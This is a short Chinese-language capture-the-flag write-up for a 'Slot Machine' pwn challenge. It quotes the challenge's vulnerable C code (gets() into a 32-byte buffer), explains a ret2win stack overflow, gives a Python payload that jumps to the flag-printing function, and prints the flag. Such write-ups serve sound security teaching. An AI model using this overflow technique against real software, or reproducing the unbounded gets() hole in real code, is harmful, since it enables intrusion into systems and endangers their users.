# Slot Machine

## 題目描述

Yay Dal just installed a slot machine for all students! Maybe I can pay my tuition if I hit big!

## 解題思路

1. **第一步**：

    看完題目給的程式後，能拿到flag的函式：

    ```c
    void jackpot() {
        FILE *f = fopen("flag.txt", "r");
        if (!f) {
            puts("flag.txt not found");
            exit(1);
        }
        char flag[64];
        fgets(flag, sizeof(flag), f);
        fclose(f);
        puts("JACKPOT! How could that happen?");
        printf("Flag: %s\n", flag);
    }
    ```

    但其實正常情況下根本沒辦法進到jackpot：

    ```c
    // Pick 3 distinct symbols (guaranteed no match)
    int a = rand() % NUM_SYMS;
    int b;
    do { b = rand() % NUM_SYMS; } while (b == a);
    int c;
    do { c = rand() % NUM_SYMS; } while (c == a || c == b);
    ```

2. **第二步**：

    因為沒有限制輸入的長度，而且cmd只有32bytes，所以可以利用ret2win：

    ```c
    void game_loop() {
        char cmd[32];

        while (1) {
            printf("\nCoins: %d\n> ", coins);
            fflush(stdout);

            if (!gets(cmd)) break;
            ...
    ```

    腳本：

    ```python
    payload = b"A" * 40
    payload += p64(ret)
    payload += p64(jackpot)
    payload += p64(exit_plt)
    ```

    40個A負責填滿cmd和saved rbp，ret負責對齊stack，然後跳到jackpot，拿到flag後退出。

## Flag

```text
dalctf{u_0n3_0f_th053_0ld_dud3s_add1ct3d_t0_sl0t_m4ch1n35}
```
